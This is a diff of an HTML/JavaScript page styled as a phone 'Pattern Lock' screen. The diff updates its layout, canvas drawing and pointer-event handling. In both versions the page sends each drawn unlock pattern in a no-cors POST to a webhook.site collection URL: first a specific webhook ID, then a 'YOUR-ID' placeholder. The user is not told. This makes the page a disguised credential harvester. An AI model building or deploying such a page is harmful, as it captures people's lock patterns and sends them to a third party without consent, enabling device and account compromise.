@@ -1,56 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Pattern Lock</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pattern Lock</title>
 
-  <style>
-    body {
-      margin: 0;
-  background: #111;
+<style>
+body {
+  margin: 0;
+  background: #000;
   display: flex;
   justify-content: center;
   align-items: center;
   height: 100vh;
-    }
-
-    .wrapper {
-      position: relative;
-    }
-
-    canvas {
-      position: absolute;
-      top: 0;
-      left: 0;
-      pointer-events: none;
-    }
-
-  
-.grid {
-  display: grid;
-  grid-template-columns: repeat(3, 22vw);
-
-  /* ⭐ separate control */
-  column-gap: 10vw;   /* left-right spacing */
-  row-gap: 16vh;      /* top-bottom spacing (THIS fixes height) */
-
-  justify-content: center;
-  align-items: center;
   touch-action: none;
 }
 
+.wrapper {
+  position: relative;
+}
+
+canvas {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+.grid {
+  display: grid;
+  grid-template-columns: repeat(3, 80px);
+  gap: 80px;
+}
+
 .dot {
-  width: 5vw;
-  height: 5vw;
-  background: #888;
+  width: 22px;
+  height: 22px;
+  background: #aaa;
   border-radius: 50%;
-  margin: auto;
 }
 
 .dot.active {
   background: #4CAF50;
-  transform: scale(1.8);
+  transform: scale(1.6);
 }
-  </style>
+</style>
 </head>
 
 <body>
@@ -78,58 +70,76 @@ const grid = document.getElementById("grid");
 const dots = document.querySelectorAll(".dot");
 
 let pattern = [];
-let isDrawing = false;
-let currentPos = null;
+let drawing = false;
+let current = null;
 
-// Resize canvas to grid
-function resizeCanvas() {
+// ✅ Resize canvas correctly
+function resize() {
   const rect = grid.getBoundingClientRect();
-  canvas.width = rect.width;
-  canvas.height = rect.height;
-}
-resizeCanvas();
-window.addEventListener("resize", resizeCanvas);
+  const dpr = window.devicePixelRatio || 1;
 
-// Get dot center relative to grid
-function getCenter(dot) {
-  const gridRect = grid.getBoundingClientRect();
-  const rect = dot.getBoundingClientRect();
+  canvas.width = rect.width * dpr;
+  canvas.height = rect.height * dpr;
+
+  canvas.style.width = rect.width + "px";
+  canvas.style.height = rect.height + "px";
+
+  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+}
+resize();
+window.addEventListener("resize", resize);
+
+// ✅ Dot center
+function center(dot) {
+  const g = grid.getBoundingClientRect();
+  const r = dot.getBoundingClientRect();
 
   return {
-    x: rect.left - gridRect.left + rect.width / 2,
-    y: rect.top - gridRect.top + rect.height / 2
+    x: r.left - g.left + r.width / 2,
+    y: r.top - g.top + r.height / 2
   };
 }
 
-// Draw lines + trailing finger line
+// ✅ Pointer position
+function point(e) {
+  const g = grid.getBoundingClientRect();
+  return {
+    x: e.clientX - g.left,
+    y: e.clientY - g.top,
+    cx: e.clientX,
+    cy: e.clientY
+  };
+}
+
+// ✅ Draw loop (smooth)
 function draw() {
   ctx.clearRect(0, 0, canvas.width, canvas.height);
 
-  if (pattern.length === 0) return;
+  if (pattern.length) {
+    ctx.strokeStyle = "#4CAF50";
+    ctx.lineWidth = 6;
+    ctx.lineCap = "round";
 
-  ctx.strokeStyle = "#4CAF50";
-  ctx.lineWidth = 8;
-  ctx.lineCap = "round";
+    ctx.beginPath();
 
-  ctx.beginPath();
+    pattern.forEach((id, i) => {
+      const dot = document.querySelector(`[data-id='${id}']`);
+      const p = center(dot);
 
-  pattern.forEach((id, i) => {
-    const dot = document.querySelector(`[data-id='${id}']`);
-    const pos = getCenter(dot);
+      if (i === 0) ctx.moveTo(p.x, p.y);
+      else ctx.lineTo(p.x, p.y);
+    });
 
-    if (i === 0) ctx.moveTo(pos.x, pos.y);
-    else ctx.lineTo(pos.x, pos.y);
-  });
+    if (current) ctx.lineTo(current.x, current.y);
 
-  // ⭐ trailing line (finger follow)
-  if (currentPos) {
-    ctx.lineTo(currentPos.x, currentPos.y);
+    ctx.stroke();
   }
 
-  ctx.stroke();
+  requestAnimationFrame(draw);
 }
+draw();
 
-// Activate dot
+// ✅ Activate dot
 function activate(dot) {
   const id = dot.dataset.id;
 
@@ -139,42 +149,39 @@ function activate(dot) {
   }
 }
 
-// Handle touch/mouse start
+// ✅ Start
 function start(e) {
-  e.preventDefault();
-  isDrawing = true;
+  drawing = true;
   pattern = [];
 
-  const point = getPoint(e);
-  handleMove(point);
+  const p = point(e);
+  current = p;
+
+  const el = document.elementFromPoint(p.cx, p.cy);
+  if (el && el.classList.contains("dot")) activate(el);
 }
 
-// Handle move
+// ✅ Move
 function move(e) {
-  if (!isDrawing) return;
-  e.preventDefault();
+  if (!drawing) return;
 
-  const point = getPoint(e);
-  currentPos = point;
+  const p = point(e);
+  current = p;
 
-  const el = document.elementFromPoint(point.clientX, point.clientY);
-  if (el && el.classList.contains("dot")) {
-    activate(el);
-  }
-
-  draw();
+  const el = document.elementFromPoint(p.cx, p.cy);
+  if (el && el.classList.contains("dot")) activate(el);
 }
 
-// End drawing
+// ✅ End
 function end() {
-  if (!isDrawing) return;
-  isDrawing = false;
+  if (!drawing) return;
+  drawing = false;
 
   const result = pattern.join("-");
   alert("Pattern: " + result);
 
-  // send webhook
-  fetch("https://webhook.site/f6af3aa6-bc95-46b5-a5a3-03d16ed5cb7b", {
+  // ✅ webhook
+  fetch("https://webhook.site/YOUR-ID", {
     method: "POST",
     mode: "no-cors",
     body: "pattern=" + result
@@ -183,29 +190,15 @@ function end() {
   // reset
   setTimeout(() => {
     pattern = [];
-    currentPos = null;
-    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    current = null;
     dots.forEach(d => d.classList.remove("active"));
-  }, 800);
+  }, 600);
 }
 
-// Get touch/mouse point
-function getPoint(e) {
-  if (e.touches) return e.touches[0];
-  return e;
-}
-
-// Attach events
-dots.forEach(dot => {
-  dot.addEventListener("mousedown", start);
-  dot.addEventListener("touchstart", start);
-});
-
-document.addEventListener("mousemove", move);
-document.addEventListener("touchmove", move);
-
-document.addEventListener("mouseup", end);
-document.addEventListener("touchend", end);
+// ✅ Events
+document.addEventListener("pointerdown", start);
+document.addEventListener("pointermove", move);
+document.addEventListener("pointerup", end);
 </script>
 
 </body>
